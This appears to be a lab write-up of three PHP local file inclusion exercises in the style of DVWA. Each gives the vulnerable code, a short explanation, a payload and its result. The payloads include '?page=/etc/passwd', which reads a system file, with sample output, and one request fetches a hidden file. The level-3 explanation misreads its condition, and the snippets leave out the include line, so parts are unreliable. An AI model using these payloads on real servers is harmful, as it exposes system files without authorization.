# Vulnerable Code 1
This code gets "page" parameter via GET request and show to the user.

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];
?>
```


## Abuse

The problem here there is no input sanitization which we can include any file and read content of it.

## Payload

```php
?page=/etc/passwd
```


## Result


```php
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin 
	sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin 
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sb....
```

# Vulnerable Code 2

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?> 
```

## Abuse

The problem here, there is input sanitizing but it prevent us to include relative files, still we can include absolute path inside of machine

## Payload

```php
?page=/etc/passwd
```

## Result

```php
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin 
		man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail....
```

# Vulnerable Code 3

```php
<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?> 
```

## Abuse

Problem here, code gets a file and there is 2 condition:

- File should start with "file"
- File shouldn't be "include.php"

Application expect us to read content of "file1" "file2" "file3" if we enumerate numbers near the files we can read secret file that doens't shown the user

## Payload

```php
?page=file4.php
```

## Result

```php
Good job!
This file isn't listed at all. If you are reading this, you did something right ;-)
```